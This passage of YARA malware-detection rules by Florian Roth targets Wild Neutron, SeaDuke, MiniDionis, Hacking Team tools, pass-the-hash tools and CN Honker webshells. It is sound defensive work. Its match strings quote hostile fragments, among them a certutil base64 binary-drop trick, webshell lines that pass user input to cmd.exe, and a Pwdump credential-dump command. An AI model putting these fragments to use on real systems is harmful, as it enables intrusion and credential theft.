      $s0 = "voicemail" ascii
      $s1 = ".exe" ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 1000KB and $s0 in ( 3 .. 80 ) and $s1 in ( 3 .. 80 )
} 

rule MAL_MiniDionis_readerView_RID30AA : DEMO EXE FILE MAL T1136 {
   meta:
      description = "MiniDionis Malware - file readerView.exe / adobe.exe"
      author = "Florian Roth"
      reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
      date = "2015-07-20 12:49:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%ws_out%ws" fullword wide
      $s2 = "dnlibsh" fullword ascii
      $op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b } 
      $op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f } 
      $op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of ( $s* ) and 1 of ( $op* )
} 

rule MAL_Malicious_SFX2_Adobe_RID2FAC : DEMO EXE FILE MAL T1136 {
   meta:
      description = "SFX with adobe.exe content"
      author = "Florian Roth"
      reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
      date = "2015-07-20 12:07:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "adobe.exe" fullword ascii
      $s2 = "Extracting files to %s folder$Extracting files to temporary folder" fullword wide
      $s3 = "GETPASSWORD1" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule Binary_Drop_Certutil_RID2F15 : DEMO SUSP T1132 T1136 T1140 {
   meta:
      description = "Drop binary as base64 encoded cert trick"
      author = "Florian Roth"
      reference = "https://goo.gl/9DNn8q"
      date = "2015-07-15 11:42:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1132, T1136, T1140"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo -----BEGIN CERTIFICATE----- >" ascii
      $s1 = "echo -----END CERTIFICATE----- >>" ascii
      $s2 = "certutil -decode " ascii
   condition: 
      filesize < 10KB and all of them
} 

rule AppInitHook_RID2B57 : DEMO EXE FILE HKTL S0002 T1003 T1075 T1097 T1136 T1178 {
   meta:
      description = "AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook_RID2B57.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/Z292v6"
      date = "2015-07-15 09:02:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, S0002, T1003, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\Release\\AppInitHook_RID2B57.pdb" ascii
      $s1 = "AppInitHook_RID2B57.dll" fullword ascii
      $s2 = "mimikatz.exe" fullword wide
      $s3 = "]X86Instruction->OperandSize >= Operand->Length" fullword wide
      $s4 = "mhook\\disasm-lib\\disasm.c" fullword wide
      $s5 = "mhook\\disasm-lib\\disasm_x86.c" fullword wide
      $s6 = "VoidFunc" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them
} 

rule MAL_SeaDuke_Sample_RID2DAD : DEMO EXE FILE MAL T1136 {
   meta:
      description = "SeaDuke Malware"
      author = "Florian Roth"
      reference = "http://goo.gl/MJ0c2M"
      date = "2015-07-14 10:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "bpython27.dll" fullword ascii
      $s1 = "email.header(" fullword ascii
      $s2 = "LogonUI.exe" fullword wide
      $s3 = "Crypto.Cipher.AES(" fullword ascii
      $s4 = "mod is NULL - %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them
} 

rule WildNeutron_Sample_1_RID2EDD : APT DEMO EXE FILE T1136 {
   meta:
      description = "Wild Neutron APT Sample Rule"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
      date = "2015-07-10 11:32:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "LiveUpdater.exe" fullword wide
      $s1 = "id-at-postalAddress" fullword ascii
      $s2 = "%d -> %d (default)" fullword wide
      $s3 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide
      $s8 = "id-ce-keyUsage" fullword ascii
      $s9 = "Key Usage" fullword ascii
      $s32 = "UPDATE_ID" fullword wide
      $s37 = "id-at-commonName" fullword ascii
      $s38 = "2008R2" fullword wide
      $s39 = "RSA-alt" fullword ascii
      $s40 = "%02d.%04d.%s" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them
} 

rule WildNeutron_Sample_2_RID2EDE : APT DEMO EXE FILE T1085 T1136 {
   meta:
      description = "Wild Neutron APT Sample Rule"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
      date = "2015-07-10 11:32:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "rundll32.exe \"%s\",#1" fullword wide
      $s1 = "IgfxUpt.exe" fullword wide
      $s2 = "id-at-postalAddress" fullword ascii
      $s3 = "Intel(R) Common User Interface" fullword wide
      $s4 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide
      $s11 = "Key Usage" fullword ascii
      $s12 = "Intel Integrated Graphics Updater" fullword wide
      $s13 = "%sexpires on    : %04d-%02d-%02d %02d:%02d:%02d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them
} 

rule WildNeutron_Sample_4_RID2EE0 : APT DEMO EXE FILE T1085 T1136 {
   meta:
      description = "Wild Neutron APT Sample Rule"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
      date = "2015-07-10 11:33:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "WinRAT-Win32-Release.exe" fullword ascii
      $s0 = "rundll32.exe \"%s\",#1" fullword wide
      $s1 = "RtlUpd.EXE" fullword wide
      $s2 = "RtlUpd.exe" fullword wide
      $s3 = "Driver Update and remove for Windows x64 or x86_32" fullword wide
      $s4 = "Realtek HD Audio Update and remove driver Tool" fullword wide
      $s5 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide
      $s6 = "Key Usage" fullword ascii
      $s7 = "id-at-serialNumber" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1240KB and all of them
} 

rule WildNeutron_Sample_5_RID2EE1 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Wild Neutron APT Sample Rule"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
      date = "2015-07-10 11:33:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "LiveUpdater.exe" fullword wide
      $s1 = "id-at-postalAddress" fullword ascii
      $s2 = "%d -> %d (default)" fullword wide
      $s3 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide
      $s4 = "sha-1WithRSAEncryption" fullword ascii
      $s5 = "Postal code" fullword ascii
      $s6 = "id-ce-keyUsage" fullword ascii
      $s7 = "Key Usage" fullword ascii
      $s8 = "TLS-RSA-WITH-3DES-EDE-CBC-SHA" fullword ascii
      $s9 = "%02d.%04d.%s" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule WildNeutron_Sample_6_RID2EE2 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Wild Neutron APT Sample Rule"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
      date = "2015-07-10 11:33:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "mshtaex.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 310KB and all of them
} 

rule WildNeutron_Sample_7_RID2EE3 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Wild Neutron APT Sample Rule"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
      date = "2015-07-10 11:33:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "checking match for '%s' user %s host %s addr %s" fullword ascii
      $s1 = "PEM_read_bio_PrivateKey failed" fullword ascii
      $s2 = "usage: %s [-ehR] [-f log_facility] [-l log_level] [-u umask]" fullword ascii
      $s3 = "%s %s for %s%.100s from %.200s port %d%s" fullword ascii
      $s4 = "clapi32.dll" fullword ascii
      $s5 = "Connection from %s port %d" fullword ascii
      $s6 = "/usr/etc/ssh_known_hosts" fullword ascii
      $s7 = "Version: %s - %s %s %s %s" fullword ascii
      $s8 = "[-] connect()" fullword ascii
      $s9 = "/bin/sh /usr/etc/sshrc" fullword ascii
      $s10 = "kexecdhs.c" fullword ascii
      $s11 = "%s: setrlimit(RLIMIT_FSIZE, { 0, 0 }): %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them
} 

rule subTee_nativecmd_RID2D93 : APT DEMO EXE FILE T1086 T1136 {
   meta:
      description = "NativeCmd - used by various threat groups"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
      date = "2015-07-10 10:37:41"
      score = 40
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "RunFile: couldn't load SHELL32.DLL!" ascii wide
      $x2 = "RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!" fullword ascii
      $x3 = "Error executing CreateProcess()!!" fullword wide
      $x4 = "cmdcmdline" fullword wide
      $x5 = "Invalid input handle!!!" fullword ascii
      $s1 = "Process %d terminated" fullword wide
      $s2 = "Process is not running any more" fullword wide
      $s3 = "javacpl.exe" fullword wide
      $s4 = "Windows NT Version %lu.%lu" fullword wide
      $s5 = "Usage: destination [reference]" fullword wide
      $s6 = ".com;.exe;.bat;.cmd" fullword wide
      $s7 = ") -%s-> %s (" fullword ascii
      $s8 = "cmdextversion" fullword wide
      $s10 = "\"%s\" /K %s" fullword wide
      $s12 = "DEBUG: Cannot allocate memory for ptrNextNode->ptrNext!" fullword ascii
      $s13 = "Failed to build full directory path" fullword wide
      $s14 = "DEBUG: Cannot allocate memory for ptrFileArray!" fullword ascii
      $s15 = "%-8s %-3s  %*s %s  %s" fullword wide
      $s16 = " %%%c in (%s) do " fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and ( 2 of ( $x* ) or 6 of ( $s* ) )
} 

rule WildNeutron_Sample_10_RID2F0D : APT DEMO EXE FILE T1136 {
   meta:
      description = "Wild Neutron APT Sample Rule"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
      date = "2015-07-10 11:40:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $n1 = "/c for /L %%i in (1,1,2) DO ping 127.0.0.1 -n 3 & type %%windir%%\\notepad.exe > %s & del /f %s" fullword ascii
      $s1 = "%SYSTEMROOT%\\temp\\_dbg.tmp" fullword ascii
      $s2 = "%SYSTEMROOT%\\SysWOW64\\mspool.dll" fullword ascii
      $s3 = "%SYSTEMROOT%\\System32\\dpcore16t.dll" fullword ascii
      $s4 = "%SYSTEMROOT%\\System32\\wdigestEx.dll" fullword ascii
      $s5 = "%SYSTEMROOT%\\System32\\mspool.dll" fullword ascii
      $s6 = "%SYSTEMROOT%\\System32\\kernel32.dll" fullword ascii
      $s7 = "%SYSTEMROOT%\\SysWOW64\\iastor32.exe" fullword ascii
      $s8 = "%SYSTEMROOT%\\System32\\msvcse.exe" fullword ascii
      $s9 = "%SYSTEMROOT%\\System32\\mshtaex.exe" fullword ascii
      $s10 = "%SYSTEMROOT%\\System32\\iastor32.exe" fullword ascii
      $s11 = "%SYSTEMROOT%\\SysWOW64\\mshtaex.exe" fullword ascii
      $x1 = "wdigestEx.dll" fullword ascii
      $x2 = "dpcore16t.dll" fullword ascii
      $x3 = "mspool.dll" fullword ascii
      $x4 = "msvcse.exe" fullword ascii
      $x5 = "mshtaex.exe" fullword wide
      $x6 = "iastor32.exe" fullword ascii
      $y1 = "Installer.exe" fullword ascii
      $y2 = "Info: Process %s" fullword ascii
      $y3 = "Error: GetFileTime %s 0x%x" fullword ascii
      $y4 = "Install succeeded" fullword ascii
      $y5 = "Error: RegSetValueExA 0x%x" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( $n1 or ( 1 of ( $s* ) and 1 of ( $x* ) and 3 of ( $y* ) ) )
} 

rule WildNeutron_javacpl_RID2ECC : APT DEMO EXE FILE T1136 {
   meta:
      description = "Wild Neutron APT Sample Rule"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
      date = "2015-07-10 11:29:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "javacpl.exe" fullword wide
      $s0 = "RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!" fullword ascii
      $s1 = "Error executing CreateProcess()!!" fullword wide
      $s2 = "http://www.java.com/en/download/installed.jsp?detect=jre" fullword ascii
      $s3 = "RunFile: couldn't load SHELL32.DLL!" fullword ascii
      $s4 = "Process is not running any more" fullword wide
      $s6 = "Windows NT Version %lu.%lu" fullword wide
      $s7 = "Usage: destination [reference]" fullword wide
      $s8 = "Invalid input handle!!!" fullword ascii
      $s9 = ".com;.exe;.bat;.cmd" fullword wide
      $s10 = ") -%s-> %s (" fullword ascii
      $s11 = "cmdextversion" fullword wide
      $s12 = "Invalid pid (%s)" fullword wide
      $s13 = "\"%s\" /K %s" fullword wide
      $s14 = "Error setting %s (%s)" fullword wide
      $s16 = "cmdcmdline" fullword wide
      $s39 = "2008R2" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1677KB and all of them
} 

rule whosthere_alt_RID2C8A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
      date = "2015-07-10 09:53:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii
      $s1 = "whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found." fullword ascii
      $s2 = "dump output to a file, -o filename" fullword ascii
      $s3 = "This tool lists the active LSA logon sessions with NTLM credentials." fullword ascii
      $s4 = "Error: pth.dll is not in the current directory!." fullword ascii
      $s5 = "the output format is: username:domain:lmhash:nthash" fullword ascii
      $s6 = ".\\pth.dll" fullword ascii
      $s7 = "Cannot get LSASS.EXE PID!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 280KB and 2 of them
} 

rule iam_alt_iam_alt_RID2D1E : APT DEMO EXE FILE T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file iam-alt.exe"
      author = "Florian Roth"
      reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
      date = "2015-07-10 10:18:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)" fullword ascii
      $s1 = "IAM-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii
      $s2 = "This tool allows you to change the NTLM credentials of the current logon session" fullword ascii
      $s3 = "username:domainname:lmhash:nthash" fullword ascii
      $s4 = "Error in cmdline!. Bye!." fullword ascii
      $s5 = "Error: Cannot open LSASS.EXE!." fullword ascii
      $s6 = "nthash is too long!." fullword ascii
      $s7 = "LSASS HANDLE: %x" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 2 of them
} 

rule genhash_genhash_RID2D2C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file genhash.exe"
      author = "Florian Roth"
      reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
      date = "2015-07-10 10:20:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "genhash.exe <password>" fullword ascii
      $s3 = "Password: %s" fullword ascii
      $s4 = "%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X" fullword ascii
      $s5 = "This tool generates LM and NT hashes." fullword ascii
      $s6 = "(hashes format: LM Hash:NT hash)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them
} 

rule iam_iamdll_RID2B1A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file iamdll.dll"
      author = "Florian Roth"
      reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
      date = "2015-07-10 08:52:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "LSASRV.DLL" fullword ascii
      $s1 = "iamdll.dll" fullword ascii
      $s2 = "ChangeCreds" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 115KB and all of them
} 

rule iam_iam_RID29DE : APT DEMO EXE FILE T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file iam.exe"
      author = "Florian Roth"
      reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
      date = "2015-07-10 01:55:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)" fullword ascii
      $s2 = "iam.exe -h administrator:mydomain:" ascii
      $s3 = "An error was encountered when trying to change the current logon credentials!." fullword ascii
      $s4 = "optional parameter. If iam.exe crashes or doesn't work when run in your system, use this parameter." fullword ascii
      $s5 = "IAM.EXE will try to locate some memory locations instead of using hard-coded values." fullword ascii
      $s6 = "Error in cmdline!. Bye!." fullword ascii
      $s7 = "Checking LSASRV.DLL...." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule whosthere_alt_pth_RID2E35 : APT DEMO EXE FILE T1075 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file pth.dll"
      author = "Florian Roth"
      reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
      date = "2015-07-10 11:04:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1075, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "c:\\debug.txt" fullword ascii
      $s1 = "pth.dll" fullword ascii
      $s2 = "\"Primary\" string found at %.8Xh" fullword ascii
      $s3 = "\"Primary\" string not found!" fullword ascii
      $s4 = "segment 1 found at %.8Xh" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 4 of them
} 

rule whosthere_RID2AEA : APT DEMO EXE FILE T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file whosthere_RID2AEA.exe"
      author = "Florian Roth"
      reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
      date = "2015-07-10 09:21:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii
      $s2 = "whosthere_RID2AEA enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found." fullword ascii
      $s3 = "specify addresses to use. Format: ADDCREDENTIAL_ADDR:ENCRYPTMEMORY_ADDR:FEEDBACK_ADDR:DESKEY_ADDR:LOGONSESSIONLIST_ADDR:LOGONSES" ascii
      $s4 = "Could not enable debug privileges. You must run this tool with an account with administrator privileges." fullword ascii
      $s5 = "-B is now used by default. Trying to find correct addresses.." fullword ascii
      $s6 = "Cannot get LSASS.EXE PID!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 320KB and 2 of them
} 

rule Hackingteam_Elevator_DLL_RID3049 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Hacking Team Disclosure Sample - file elevator.dll"
      author = "Florian Roth"
      reference = "http://t.co/EG0qtVcKLh"
      date = "2015-07-07 12:33:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\sysnative\\CI.dll" fullword ascii
      $s2 = "setx TOR_CONTROL_PASSWORD" fullword ascii
      $s3 = "mitmproxy0" fullword ascii
      $s4 = "\\insert_cert.exe" fullword ascii
      $s5 = "elevator.dll" fullword ascii
      $s6 = "CRTDLL.DLL" fullword ascii
      $s7 = "fail adding cert" fullword ascii
      $s8 = "DownloadingFile" fullword ascii
      $s9 = "fail adding cert: %s" fullword ascii
      $s10 = "InternetOpenA fail" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 6 of them
} 

rule HackingTeam_Elevator_EXE_RID302F : APT DEMO EXE FILE T1136 {
   meta:
      description = "Hacking Team Disclosure Sample - file elevator.exe"
      author = "Florian Roth"
      reference = "Hacking Team Disclosure elevator.c"
      date = "2015-07-07 12:29:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "CRTDLL.DLL" fullword ascii
      $x2 = "\\sysnative\\CI.dll" fullword ascii
      $x3 = "\\SystemRoot\\system32\\CI.dll" fullword ascii
      $x4 = "C:\\\\Windows\\\\Sysnative\\\\ntoskrnl.exe" fullword ascii
      $s1 = "[*] traversing processes" fullword ascii
      $s2 = "_getkprocess" fullword ascii
      $s3 = "[*] LoaderConfig %p" fullword ascii
      $s4 = "loader.obj" fullword ascii
      $s5 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3" ascii
      $s6 = "[*] token restore" fullword ascii
      $s7 = "elevator.obj" fullword ascii
      $s8 = "_getexport" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of ( $x* ) and 3 of ( $s* )
} 

rule CN_Honker_mempodipper2_6_RID3030 : CHINA DEMO HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file mempodipper2.6.39"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:29:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed" ascii
   condition: 
      filesize < 30KB and all of them
} 

rule CN_Honker_Tuoku_script_oracle_2_RID3339 : CHINA DEMO HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file oracle.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:38:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "webshell" fullword ascii
      $s1 = "Silic Group Hacker Army " fullword ascii
   condition: 
      filesize < 3KB and all of them
} 

rule CN_Honker_Pwdump7_Pwdump7_RID308E : CHINA DEMO SUSP T1003 T1136 {
   meta:
      description = "Script from disclosed CN Honker Pentest Toolset - file Pwdump7.bat"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:44:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Pwdump7.exe >pass.txt" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule CN_Honker_Webshell_PHP_php5_RID3120 : CHINA DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php5.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user" ascii
      $s20 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$" ascii
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 300KB and all of them
} 

rule CN_Honker_Webshell_test3693_RID30F1 : CHINA DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file test3693.war"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:01:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - " ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 50KB and all of them
} 

rule CN_Honker_Webshell_mycode12_RID3140 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mycode12.cfm"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:14:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<cfexecute name=\"cmd.exe\"" fullword ascii
      $s2 = "<cfoutput>#cmd#</cfoutput>" fullword ascii
   condition: 
      filesize < 4KB and all of them
} 

rule CN_Honker_Webshell_offlibrary_RID328C : CHINA DEMO T1100 T1136 WEBSHELL {
